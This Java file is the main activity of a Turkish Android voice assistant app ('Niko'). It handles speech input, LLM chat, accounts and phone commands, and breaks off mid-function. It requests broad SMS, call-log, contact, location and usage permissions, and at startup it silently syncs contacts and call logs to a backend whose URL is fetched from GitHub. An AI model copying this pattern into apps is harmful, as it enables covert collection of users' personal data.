package com.example.niko;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.RemoteInput;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.speech.RecognitionListener;
import android.speech.RecognizerIntent;
import android.speech.SpeechRecognizer;
import android.speech.tts.TextToSpeech;
import android.speech.tts.UtteranceProgressListener;
import android.view.View;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.Toast;
import android.media.MediaPlayer;
import android.media.AudioManager;
import android.view.KeyEvent;
import android.util.Base64;
import android.os.Build;
import java.io.File;
import java.io.FileOutputStream;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.os.BatteryManager;
import android.os.Environment;
import android.os.StatFs;
import android.location.Location;
import android.location.LocationManager;
import java.util.List;
import android.content.pm.ResolveInfo;
import android.provider.MediaStore;
import java.io.ByteArrayOutputStream;

import java.io.InputStream;
import java.io.OutputStream;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.Locale;
import java.util.Queue;
import java.util.Date;
import java.text.SimpleDateFormat;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import android.provider.AlarmClock;
import android.provider.CalendarContract;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.Calendar;
import android.net.wifi.WifiManager;
import android.bluetooth.BluetoothAdapter;
import android.view.Window;
import android.view.WindowManager;
import android.content.SharedPreferences;

import android.os.AsyncTask;
import android.widget.LinearLayout;
import android.graphics.Color;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.widget.Button;
import android.view.ViewGroup;
import android.text.TextWatcher;
import android.text.Editable;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.widget.EditText;
import android.text.SpannableString;
import android.text.style.BackgroundColorSpan;
import android.text.Spanned;
import android.view.animation.Animation;
import android.view.animation.TranslateAnimation;
import android.view.animation.AlphaAnimation;
import android.view.animation.AnimationSet;
import android.view.animation.ScaleAnimation;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.view.WindowInsets;
import android.view.inputmethod.InputMethodManager;
import androidx.core.content.FileProvider;
import android.telephony.TelephonyManager;
import android.hardware.SensorManager;
import android.hardware.Sensor;
import android.app.usage.UsageStatsManager;
import android.app.usage.UsageStats;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraCharacteristics;
import android.provider.Telephony;

/**
 * Niko Mobil Uygulaması Ana Aktivitesi
 * 
 * Bu sınıf, uygulamanın çekirdek bileşenidir. Android Wear tarzı bir sesli asistan
 * arayüzü sunar. Temel özellikleri:
 * - Ses tanıma (Speech to Text) ve Metin okuma (Text to Speech)
 * - Yapay Zeka (Ollama/LLM) ile canlı sohbet
 * - Cihaz kontrolleri (Arama, Alarm, Müzik, Sistem Ayarları)
 * - Kullanıcı kayıt ve profil yönetimi
 */
public class MainActivity extends Activity {

    // İzin talebi için kullanılan sabit kod (Permission request code)
    private static final int PERMISSION_CODE = 100;

    // Arayüz bileşenleri (Main UI)
    private View voiceOrb; // Ses aktivitesini görselleştiren yuvarlak simge
    private ImageButton btnMic; // Mikrofon butonu
    private TextView txtAIResponse; // AI veya sistem yanıtlarını gösteren metin alanı
    private View aiResponseContainer; // Yanıt metnini tutan ScrollView

    // Ses ve TTS (Metin Okuma) bileşenleri (Voice & TTS)
    private SpeechRecognizer speechRecognizer; // Sesi yazıya çevirmek için
    private Intent speechIntent;
    private TextToSpeech tts; // Yazıyı sese çevirmek için

    // Durum ve Kontrol Değişkenleri (State & Control)
    private boolean isListening = false; // Uygulamanın mikrofonu dinleyip dinlemediğini takip eder
    private final Queue<String> ttsQueue = new LinkedList<>(); // TTS motorunun sırayla okuması için metin kuyruğu

    // Geçmiş bileşenleri (History Components)
    private ImageButton btnHistory;
    private View layoutHistory;
    private ImageButton btnCloseHistory;
    private Button btnClearHistory;
    private Button btnExportHistory;
    private LinearLayout containerHistoryItems;
    private SharedPreferences historyPrefs;
    private TextView txtHistoryStats;
    private EditText edtHistorySearch;
    private ImageButton btnClearSearch;
    private View layoutHistoryEmpty;
    private Button btnStartNewChat;
    // Stats kartları
    private TextView txtStatTotalChats;
    private TextView txtStatThisWeek;
    private TextView txtStatToday;
    private final Object historyLock = new Object();
    private static final int MAX_HISTORY_ITEMS = 100; // Maksimum geçmiş öğesi sayısı
    
    // Oturum ve Model Ayarları (Session & Model Settings)
    private String sessionId = null; // AI ile süregelen sohbetin benzersiz oturum kimliği
    private SharedPreferences sessionPrefs; // Oturum bilgilerini kalıcı tutmak için
    private SharedPreferences modelPrefs; // Seçilen AI modelini kalıcı tutmak için
    private String selectedModel = null; // Şu an aktif olan yapay zeka modeli

    // Arama modu durumu (Search Mode)
    private boolean isWebSearchEnabled = false;
    private ImageButton btnWebSearch;
    private ImageButton btnStop;
    private SharedPreferences searchPrefs;

    // Model seçimi bileşenleri (Model Selection UI)
    private ImageButton btnModel;
    private View layoutModels;
    private ImageButton btnCloseModels;
    private LinearLayout containerModelItems;
    private TextView txtCurrentModel;
    private TextView txtMainActiveModel;

    // Mobil uygulamada gösterilmeyecek modeller (Hidden Models)
    private static final String[] HIDDEN_MODELS = {
            "llama3.2-vision:11b",
            "necdetuygur/developer:latest",
            "nomic-embed-text:latest",
            "codegemma:7b",
            "qwen2.5-coder:7b"
    };

    // Hesap/Profil bileşenleri (Account/Profile UI)
    private ImageView imgTopProfile, imgMainProfile;
    private View layoutAccount;
    private ImageButton btnCloseAccount;
    private TextView txtAccountTitle;
    private EditText edtUsername, edtPassword, edtEmail, edtFullName;
    private View layoutRegisterExtras, layoutAccountFields;
    // Doğrulama Kodu Değişkenleri
    private View layoutVerification;
    private EditText edtVerifyCode;
    private Button btnVerifyCode;
    private TextView btnResendCode, btnCancelVerification;
    private Button btnSubmitAccount;
    private TextView btnSwitchMode;
    private View layoutLoggedIn;
    private TextView txtLoginStatus;
    private Button btnLogout, btnEditProfile, btnDeleteAccount;
    
    // Yeni profil kartı bileşenleri (Premium Profile Card)
    private TextView txtProfileUsername, txtProfileEmail, txtProfileFullName;
    private TextView txtProfileDisplayName, txtProfileUsernameSmall;
    private ImageView imgProfileAvatar;
    private EditText edtCurrentPassword;
    private TextView txtCurrentPasswordLabel, txtPasswordLabel;
    private SharedPreferences authPrefs;
    private String authToken = null;
    private String authUsername = null;
    private boolean isRegisterMode = false;
    private boolean isEditProfileMode = false;
    private static final int PICK_IMAGE_REQUEST = 1001;
    private String selectedImageBase64 = null;

    // WhatsApp entegrasyonu için veriler (WhatsApp Integration)
    public static String lastWhatsAppMessage; // Son okunan mesaj
    public static String lastWhatsAppSender; // Son mesajın göndericisi
    public static PendingIntent lastReplyIntent; // Cevap vermek için intent
    public static RemoteInput lastRemoteInput; // Cevap girişi için referans
    
    // Admin Log Sistemi (Admin Log System)
    private View layoutAdminLogs;
    private TextView txtAdminLogs;
    private ImageButton btnCloseLogs;
    private Button btnCopyLogs, btnClearLogs, btnShowLogs;
    private final StringBuilder appLogsBuffer = new StringBuilder();
    private final int MAX_LOG_SIZE = 50000; // Karakter sınırı

    // API URL - Backend servisinin adresi (GitHub'dan güncellenir)
    private static String API_BASE_URL = ""; // GitHub'dan güncellenir

    // Otomatik Güncelleme
    private static final String GITHUB_VERSION_URL = "https://raw.githubusercontent.com/Memati8383/niko-with-kiro/refs/heads/main/version.json";
    private static final String GITHUB_APK_URL = "https://github.com/Memati8383/niko-with-kiro/releases/latest/download/niko.apk";
    private SharedPreferences updatePrefs;
    private String latestVersion = "";
    private String updateDescription = "";
    private String updateChangelog = "";
    private long updateFileSize = 0;
    private android.app.Dialog updateDialog;
    private android.widget.ProgressBar updateProgressBar;
    private android.widget.TextView updateProgressText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // En son başarılı olan URL'yi tercihlerden yükle
        SharedPreferences appPrefs = getSharedPreferences("app_settings", MODE_PRIVATE);
        API_BASE_URL = appPrefs.getString("api_url", API_BASE_URL);
        
        // GitHub'dan güncel URL'yi çek (Arka planda)
        updateApiUrlFromGithub();

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Arayüz elemanlarını bağla
        voiceOrb = findViewById(R.id.voiceOrb);
        btnMic = findViewById(R.id.btnMic);
        txtAIResponse = findViewById(R.id.txtAIResponse);
        aiResponseContainer = findViewById(R.id.aiResponseContainer);

        // Geçmiş arayüzünü bağla
        btnHistory = findViewById(R.id.btnHistory);
        layoutHistory = findViewById(R.id.layoutHistory);
        btnCloseHistory = findViewById(R.id.btnCloseHistory);
        btnClearHistory = findViewById(R.id.btnClearHistory);
        btnExportHistory = findViewById(R.id.btnExportHistory);
        containerHistoryItems = findViewById(R.id.containerHistoryItems);
        txtHistoryStats = findViewById(R.id.txtHistoryStats);
        edtHistorySearch = findViewById(R.id.edtHistorySearch);
        btnClearSearch = findViewById(R.id.btnClearSearch);
        layoutHistoryEmpty = findViewById(R.id.layoutHistoryEmpty);
        btnStartNewChat = findViewById(R.id.btnStartNewChat);
        // Stats kartları
        txtStatTotalChats = findViewById(R.id.txtStatTotalChats);
        txtStatThisWeek = findViewById(R.id.txtStatThisWeek);
        txtStatToday = findViewById(R.id.txtStatToday);

        historyPrefs = getSharedPreferences("chat_history", MODE_PRIVATE);
        sessionPrefs = getSharedPreferences("session_settings", MODE_PRIVATE);
        modelPrefs = getSharedPreferences("model_settings", MODE_PRIVATE);
        sessionId = sessionPrefs.getString("session_id", null);
        selectedModel = modelPrefs.getString("selected_model", null);

        // Model seçimi bileşenlerini bağla
        btnModel = findViewById(R.id.btnModel);
        layoutModels = findViewById(R.id.layoutModels);
        btnCloseModels = findViewById(R.id.btnCloseModels);
        containerModelItems = findViewById(R.id.containerModelItems);
        txtCurrentModel = findViewById(R.id.txtCurrentModel);
        txtMainActiveModel = findViewById(R.id.txtMainActiveModel);

        if (selectedModel != null) {
            txtCurrentModel.setText(selectedModel);
            String cleanName = selectedModel.split(":")[0];
            txtMainActiveModel.setText(cleanName);
        } else {
            txtMainActiveModel.setText("Niko AI");
        }

        // Hesap bileşenlerini bağla
        imgTopProfile = findViewById(R.id.imgTopProfile);
        imgMainProfile = findViewById(R.id.imgMainProfile);
        layoutAccount = findViewById(R.id.layoutAccount);
        btnCloseAccount = findViewById(R.id.btnCloseAccount);
        txtAccountTitle = findViewById(R.id.txtAccountTitle);
        edtUsername = findViewById(R.id.edtUsername);
        edtPassword = findViewById(R.id.edtPassword);
        edtEmail = findViewById(R.id.edtEmail);
        edtFullName = findViewById(R.id.edtFullName);
        layoutRegisterExtras = findViewById(R.id.layoutRegisterExtras);
        layoutAccountFields = findViewById(R.id.layoutAccountFields);
        
        // Doğrulama Bileşenleri
        layoutVerification = findViewById(R.id.layoutVerification);
        edtVerifyCode = findViewById(R.id.edtVerifyCode);
        btnVerifyCode = findViewById(R.id.btnVerifyCode);
        btnResendCode = findViewById(R.id.btnResendCode);
        btnCancelVerification = findViewById(R.id.btnCancelVerification);
        
        btnSubmitAccount = findViewById(R.id.btnSubmitAccount);
        btnSwitchMode = findViewById(R.id.btnSwitchMode);
        layoutLoggedIn = findViewById(R.id.layoutLoggedIn);
        txtLoginStatus = findViewById(R.id.txtLoginStatus);
        btnLogout = findViewById(R.id.btnLogout);
        btnEditProfile = findViewById(R.id.btnEditProfile);
        btnDeleteAccount = findViewById(R.id.btnDeleteAccount);
        edtCurrentPassword = findViewById(R.id.edtCurrentPassword);
        txtCurrentPasswordLabel = findViewById(R.id.txtCurrentPasswordLabel);
        txtPasswordLabel = findViewById(R.id.txtPasswordLabel);
        
        // Yeni profil kartı bileşenlerini bağla
        txtProfileUsername = findViewById(R.id.txtProfileUsername);
        txtProfileEmail = findViewById(R.id.txtProfileEmail);
        txtProfileFullName = findViewById(R.id.txtProfileFullName);
        imgProfileAvatar = findViewById(R.id.imgProfileAvatar);
        // Premium profil paneli ek bileşenleri
        txtProfileDisplayName = findViewById(R.id.txtProfileDisplayName);
        txtProfileUsernameSmall = findViewById(R.id.txtProfileUsernameSmall);

        authPrefs = getSharedPreferences("auth_settings", MODE_PRIVATE);
        authToken = authPrefs.getString("access_token", null);
        authUsername = authPrefs.getString("username", null);

        updatePrefs = getSharedPreferences("update_settings", MODE_PRIVATE);

        imgTopProfile.setOnClickListener(v -> {
            vibrateFeedback();
            showAccount();
        });
        btnCloseAccount.setOnClickListener(v -> {
            vibrateFeedback();
            hideAccount();
        });
        btnSwitchMode.setOnClickListener(v -> {
            vibrateFeedback();
            animateButtonClick(v);
            toggleAccountMode();
        });
        btnSubmitAccount.setOnClickListener(v -> {
            vibrateFeedback();
            animateButtonClick(v);
            performAccountAction();
        });
        
        // Doğrulama Listenerları
        btnVerifyCode.setOnClickListener(v -> {
            String code = edtVerifyCode.getText().toString().trim();
            if (code.length() == 6) {
                verifyCodeAndRegister(code);
            } else {
                Toast.makeText(this, "Lütfen 6 haneli kodu girin", Toast.LENGTH_SHORT).show();
            }
        });
        
        btnResendCode.setOnClickListener(v -> {
            String email = edtEmail.getText().toString().trim();
            String username = edtUsername.getText().toString().trim();
            if (!email.isEmpty()) {
                // Resend endpoint veya tekrar registerRequest çağır (send-verification aynı işi görür)
                registerRequest(username, "", email, ""); // Şifre/isim önemsiz sadece kod için
                Toast.makeText(this, "Kod tekrar isteniyor...", Toast.LENGTH_SHORT).show();
            }
        });
        
        btnCancelVerification.setOnClickListener(v -> {
            animateVerificationExit();
            edtVerifyCode.setText("");
        });


        // Admin Log Bileşenlerini Bağla
        layoutAdminLogs = findViewById(R.id.layoutAdminLogs);
        txtAdminLogs = findViewById(R.id.txtAdminLogs);
        btnCloseLogs = findViewById(R.id.btnCloseLogs);
        btnCopyLogs = findViewById(R.id.btnCopyLogs);
        btnClearLogs = findViewById(R.id.btnClearLogs);
        btnShowLogs = findViewById(R.id.btnShowLogs);

        btnShowLogs.setOnClickListener(v -> showLogs());
        btnCloseLogs.setOnClickListener(v -> hideLogs());
        btnClearLogs.setOnClickListener(v -> {
            appLogsBuffer.setLength(0);
            updateLogDisplay();
        });
        btnCopyLogs.setOnClickListener(v -> {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("niko_logs", appLogsBuffer.toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Loglar kopyalandı", Toast.LENGTH_SHORT).show();
        });

        addLog("Uygulama başlatıldı. API: " + API_BASE_URL);
        btnEditProfile.setOnClickListener(v -> enableEditMode());
        btnLogout.setOnClickListener(v -> performLogout());
        btnDeleteAccount.setOnClickListener(v -> showDeleteAccountConfirmation());

        // Gerekli başlatma işlemleri
        requestPermissions(); // İzinleri iste
        initSpeech(); // Konuşma tanıma servisini başlat
        initTTS(); // Metin okuma servisini başlat

        // Mikrofon butonuna tıklayınca dinlemeyi başlat
        btnMic.setOnClickListener(v -> {
            vibrateFeedback();
            startListening();
        });

        // Geçmiş butonları
        btnHistory.setOnClickListener(v -> showHistory(""));
        btnCloseHistory.setOnClickListener(v -> hideHistory());
        btnClearHistory.setOnClickListener(v -> clearHistory());
        btnExportHistory.setOnClickListener(v -> exportHistory());
        btnClearSearch.setOnClickListener(v -> {
            edtHistorySearch.setText("");
            btnClearSearch.setVisibility(View.GONE);
        });
        btnStartNewChat.setOnClickListener(v -> {
            hideHistory();
            // Ana ekrana dönüş yaparak yeni konuşma başlat
        });

        // Model butonları
        btnModel.setOnClickListener(v -> showModels());
        btnCloseModels.setOnClickListener(v -> hideModels());

        // Arama çubuğu takibi
        edtHistorySearch.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                // Sadece panel görünürse güncelleme yap (kapatırken metin temizlenince tekrar
                // açılmasını önler)
                if (layoutHistory.getVisibility() == View.VISIBLE) {
                    showHistory(s.toString());
                }
                // Temizle butonunun görünürlüğünü ayarla
                if (btnClearSearch != null) {
                    btnClearSearch.setVisibility(s.length() > 0 ? View.VISIBLE : View.GONE);
                }
            }

            @Override
            public void afterTextChanged(Editable s) {
            }
        });

        // Arama modu bileşenlerini bağla
        btnWebSearch = findViewById(R.id.btnWebSearch);
        searchPrefs = getSharedPreferences("search_settings", MODE_PRIVATE);

        isWebSearchEnabled = searchPrefs.getBoolean("web_search", false);

        updateSearchIcons();

        btnWebSearch.setOnClickListener(v -> {
            isWebSearchEnabled = !isWebSearchEnabled;
            searchPrefs.edit().putBoolean("web_search", isWebSearchEnabled).apply();
            updateSearchIcons();
            // speak(isWebSearchEnabled ? "Web araması aktif" : "Web araması kapatıldı",
            // false);
        });

        // Durdurma butonu (Geliştirildi)
        btnStop = findViewById(R.id.btnStop);
        btnStop.setOnClickListener(v -> {
            vibrateFeedback();
            // 1. Konuşmayı durdur
            if (tts != null && tts.isSpeaking()) {
                tts.stop();
                ttsQueue.clear();
            }
            // 2. Dinlemeyi durdur
            if (isListening && speechRecognizer != null) {
                speechRecognizer.cancel();
                isListening = false;
            }
            // 3. UI Temizle
            runOnUiThread(() -> {
                aiResponseContainer.setVisibility(View.GONE);
                txtAIResponse.setText("");
            });
        });

        // Uzun basınca hafızayı ve oturumu sıfırla (Hard Reset)
        btnStop.setOnLongClickListener(v -> {
            vibrateFeedback();
            // Oturumu sıfırla
            sessionId = null;
            sessionPrefs.edit().remove("session_id").apply();
            // Hafızayı temizle
            clearHistory();
            Toast.makeText(this, "Hafıza ve oturum sıfırlandı", Toast.LENGTH_SHORT).show();
            return true;
        });

        // Uygulama başladığında rehber ve arama kayıtlarını arka planda senkronize et
        syncAllData();

        // Orb Animasyonunu Başlat
        startBreathingAnimation();

        // Safe Area (WindowInsets) Ayarı - Alt barın navigasyon çubuğuyla çakışmasını önler
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            findViewById(R.id.mainLayout).setOnApplyWindowInsetsListener((view, insets) -> {
                int navBarHeight = insets.getInsets(WindowInsets.Type.systemBars()).bottom;
                float density = getResources().getDisplayMetrics().density;
                int extraPadding = (int) (40 * density); // 40dp standart boşluk
                findViewById(R.id.bottomControlArea).setPadding(0, 0, 0, navBarHeight + extraPadding);
                return insets;
            });
        }

        // Başlangıçta hesap durumunu kontrol et (Giriş yapılmışsa profil fotosunu yükler)
        updateAccountUI();
        
        // Input animasyonlarını ayarla
        setupInputAnimations();
        
        // Otomatik güncelleme kontrolü (Arka planda)
        checkForUpdates();
    }

    /**
     * Orb için yumuşak bir nefes alma animasyonu başlatır.
     * Uygulamanın "canlı" hissettirmesini sağlar.
     */
    private void startBreathingAnimation() {
        View orbSection = findViewById(R.id.orbSection);
        AnimationSet animSet = new AnimationSet(true);
        animSet.setInterpolator(new AccelerateDecelerateInterpolator());

        AlphaAnimation alpha = new AlphaAnimation(0.6f, 1.0f);
        alpha.setDuration(3000);
        alpha.setRepeatMode(Animation.REVERSE);
        alpha.setRepeatCount(Animation.INFINITE);

        ScaleAnimation scale = new ScaleAnimation(0.95f, 1.05f, 0.95f, 1.05f,
                Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f);
        scale.setDuration(3000);
        scale.setRepeatMode(Animation.REVERSE);
        scale.setRepeatCount(Animation.INFINITE);

        animSet.addAnimation(alpha);
        animSet.addAnimation(scale);
        orbSection.startAnimation(animSet);
    }

    /**
     * Kullanıcıya fiziksel bir geri bildirim vermek için cihazı kısa süreli titreştirir.
     */
    private void vibrateFeedback() {
        try {
            android.os.Vibrator v = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) {
                // Android 8.0 (Oreo) ve üzeri için yeni titreşim API'si kullanılır
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(android.os.VibrationEffect.createOneShot(20, 50));
                } else {
                    v.vibrate(20);
                }
            }
        } catch (Exception ignored) {
            // Titreşim motoru yoksa veya hata oluşursa sessizce geç
        }
    }

    // ================= İZİNLER (PERMISSIONS) =================

    /**
     * Uygulamanın çalışması için gerekli tüm izinleri kullanıcıdan ister.
     * Ses kaydı, rehber okuma, arama yapma vb.
     */
    private void requestPermissions() {
        String[] perms = {
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.INTERNET,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                // Yeni Eklenen İzinler
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_PHONE_STATE
        };
        
        // Android 12 (SDK 31) ve üzeri için Bluetooth izni
        if (Build.VERSION.SDK_INT >= 31) {
            // Arrays.asList ve ArrayList kullanımı ile dinamik ekleme
            ArrayList<String> permList = new ArrayList<>();
            for (String p : perms) permList.add(p);
            permList.add(Manifest.permission.BLUETOOTH_CONNECT);
            perms = permList.toArray(new String[0]);
        }

        ArrayList<String> list = new ArrayList<>();
        for (String p : perms) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                list.add(p);
            }
        }
        
        if (!list.isEmpty()) {
            requestPermissions(list.toArray(new String[0]), PERMISSION_CODE);
        }

        // Usage Stats (Kullanım İstatistikleri) İzni Özel Olarak İstenmeli
        if (!hasUsageStatsPermission()) {
            Toast.makeText(this, "Lütfen Kullanım Erişimi iznini verin", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        }
    }

    private boolean hasUsageStatsPermission() {
        UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
        long now = System.currentTimeMillis();
        List<UsageStats> stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 1000 * 10, now);
        return stats != null && !stats.isEmpty();
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] res) {
        for (int r : res) {
            if (r != PackageManager.PERMISSION_GRANTED) {
                speak("Tüm izinler gerekli");
                return;
            }
        }
    }

    // ================= KONUŞMA TANIMA (SPEECH RECOGNITION) =================

    /**
     * Konuşma tanıma servisini başlatır ve ayarlar.
     */
    private void initSpeech() {
        // Android'in yerleşik konuşma tanıyıcısını oluştur
        speechRecognizer = SpeechRecognizer.createSpeechRecognizer(this);

        // Tanıma parametrelerini ayarla
        speechIntent = new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH);
        speechIntent.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM);
        speechIntent.putExtra(RecognizerIntent.EXTRA_LANGUAGE, "tr-TR"); // Türkçe dili
        speechIntent.putExtra(RecognizerIntent.EXTRA_PREFER_OFFLINE, true); // Mümkünse çevrimdışı çalışmayı tercih et

        speechRecognizer.setRecognitionListener(new RecognitionListener() {

            @Override
            public void onResults(Bundle results) {
                isListening = false;
                ArrayList<String> list = results.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION);
                if (list == null || list.isEmpty())
                    return;

                // Kullanıcının söylediği ilk (en olası) cümleyi al
                String cmd = list.get(0);
                String cmdLower = cmd.toLowerCase();
                saveToHistory("Ben", cmd); // Orijinal haliyle kaydet

                // 1. Önce yerel komut mu diye kontrol et (alarm, arama, müzik vb.)
                if (!handleCommand(cmdLower)) {
                    // 2. Eğer yerel bir komut değilse interneti kontrol et
                    if (isNetworkAvailable()) {
                        // İnternet varsa Yapay Zeka'ya sor
                        askAI(cmd);
                    } else {
                        // İnternet yoksa kullanıcıyı bilgilendir
                        speak("İnternet bağlantım yok. Şimdilik sadece yerel komutları (saat, tarih, arama gibi) uygulayabilirim.");
                    }
                }
            }

            public void onError(int e) {
                // Hata durumunda dinlemeyi bırak
                isListening = false;
            }

            public void onReadyForSpeech(Bundle b) {
            }

            public void onBeginningOfSpeech() {
                // Konuşma başladığında kullanıcıya geri bildirim ver
                runOnUiThread(() -> {
                    aiResponseContainer.setVisibility(View.VISIBLE);
                    txtAIResponse.setText("Dinliyorum...");
                });
            }

            public void onRmsChanged(float rmsdB) {
                // Ses şiddetine göre ekrandaki yuvarlağın boyutunu değiştir (görsel efekt)
                // Daha pürüzsüz bir ölçeklendirme için değerleri sınırlıyoruz ve max scale 1.4
                // koyuyoruz
                float rawScale = 1.0f + (Math.max(0, rmsdB) / 20.0f);
                float scale = Math.min(rawScale, 1.4f);

                voiceOrb.animate().scaleX(scale).scaleY(scale).setDuration(50).start();

                // Halo efektini de ölçeklendir (limitli büyüme)
                View orbHalo = findViewById(R.id.orbHalo);
                if (orbHalo != null) {
                    float haloScale = Math.min(1.0f + (Math.max(0, rmsdB) / 12.0f), 1.6f);
                    orbHalo.animate().scaleX(haloScale).scaleY(haloScale).alpha(0.2f + (rmsdB / 25.0f)).setDuration(120)
                            .start();
                }
            }

            public void onBufferReceived(byte[] b) {
            }

            public void onEndOfSpeech() {
            }

            public void onPartialResults(Bundle b) {
            }

            public void onEvent(int t, Bundle b) {
            }
        });
    }

    /**
     * Mikrofonu dinlemeye başlatır.
     */
    private void startListening() {
        if (!isListening) {
            isListening = true;
            speechRecognizer.startListening(speechIntent);
        }
    }

    // ================= KOMUT İŞLEME (COMMAND HANDLING) =================

    /**
     * Gelen sesli komutu analiz eder ve uygun işlemi yapar.
     * 
     * @param c Kullanıcının söylediği cümle (küçük harfe çevrilmiş)
     * @return Komut işlendiyse true, işlenmediyse (AI'ya sorulacaksa) false döner.
     */
    private boolean handleCommand(String c) {

        // --- NIKO KİMLİK KONTROLÜ ---
        if (c.contains("adın ne") || c.contains("kimsin") || c.contains("kendini tanıt")) {
            speak("Benim adım Niko. Senin kişisel yapay zeka asistanınım.");
            return true;
        }

        // --- WHATSAPP İŞLEMLERİ ---
        if (c.contains("whatsapp") && c.contains("oku")) {
            readLastWhatsAppMessage();
            return true;
        }

        if (c.contains("whatsapp") && c.contains("cevap")) {
            replyWhatsApp("Tamam"); // Basit otonom cevap örneği
            return true;
        }

        // --- ARAMA İŞLEMLERİ ---
        if (c.contains("son gelen")) {
            callLast(CallLog.Calls.INCOMING_TYPE);
            return true;
        }

        if (c.contains("son aranan")) {
            callLast(CallLog.Calls.OUTGOING_TYPE);
            return true;
        }

        if (c.contains("ara")) {
            // "Ahmet'i ara" gibi komutlardan ismi ayıkla
            callByName(c.replace("ara", "").trim());
            return true;
        }

        // --- TARİH VE SAAT ---
        if (c.contains("saat kaç") || c.contains("saati söyle")) {
            SimpleDateFormat sdf = new SimpleDateFormat("HH:mm", Locale.getDefault());
            speak("Saat şu an " + sdf.format(new Date()));
            return true;
        }

        if (c.contains("tarih") || c.contains("bugün günlerden ne") || c.contains("hangi gündeyiz")) {
            SimpleDateFormat sdf = new SimpleDateFormat("dd MMMM yyyy EEEE", new Locale("tr", "TR"));
            speak("Bugün " + sdf.format(new Date()));
            return true;
        }

        // --- KAMERA ---
        if (c.contains("kamera aç") || c.contains("fotoğraf çek")) {
            try {
                Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
                startActivity(intent);
                speak("Kamera açılıyor");
            } catch (Exception e) {
                speak("Kamera uygulaması bulunamadı.");
            }
            return true;
        }

        // --- AYARLAR EKRANI ---
        if (c.contains("ayarları aç")) {
            startActivity(new Intent(Settings.ACTION_SETTINGS));
            speak("Ayarlar açılıyor");
            return true;
        }

        // --- MÜZİK KONTROLLERİ ---
        // "müziği", "müzikler", "şarkıyı", "parça", "spotify" gibi varyasyonları
        // kapsamak için genişletildi
        if (c.contains("müzik") || c.contains("müzi") || c.contains("şarkı") || c.contains("spotify")
                || c.contains("parça")) {
            if (c.contains("başlat") || c.contains("oynat") || c.contains("devam") || c.contains("çal")
                    || c.contains("aç")) {
                controlMusic(KeyEvent.KEYCODE_MEDIA_PLAY);
                speak("Müzik başlatılıyor");
                return true;
            }
            if (c.contains("durdur") || c.contains("duraklat") || c.contains("kapat")) {
                controlMusic(KeyEvent.KEYCODE_MEDIA_PAUSE);
                speak("Müzik durduruldu");
                return true;
            }
            if (c.contains("sonraki") || c.contains("geç") || c.contains("değiştir") || c.contains("atla")
                    || c.contains("sıradaki")) {
                controlMusic(KeyEvent.KEYCODE_MEDIA_NEXT);
                speak("Sonraki şarkı");
                return true;
            }
            if (c.contains("önceki") || c.contains("başa") || c.contains("geri")) {
                controlMusic(KeyEvent.KEYCODE_MEDIA_PREVIOUS);
                speak("Önceki şarkı");
                return true;
            }
        }

        // --- ALARM & HATIRLATICI ---
        if (c.contains("alarm")) {
            setAlarm(c);
            return true;
        }

        if (c.contains("hatırlat") || c.contains("anımsat")) {
            setReminder(c);
            return true;
        }

        // --- SİSTEM AYARLARI KONTROLÜ (WIFI, BT) ---
        if (c.contains("wifi") || c.contains("wi-fi") || c.contains("internet")) {
            if (c.contains("aç")) {
                controlWifi(true);
                return true;
            }
            if (c.contains("kapat")) {
                controlWifi(false);
                return true;
            }
        }

        if (c.contains("bluetooth")) {
            if (c.contains("aç")) {
                controlBluetooth(true);
                return true;
            }
            if (c.contains("kapat")) {
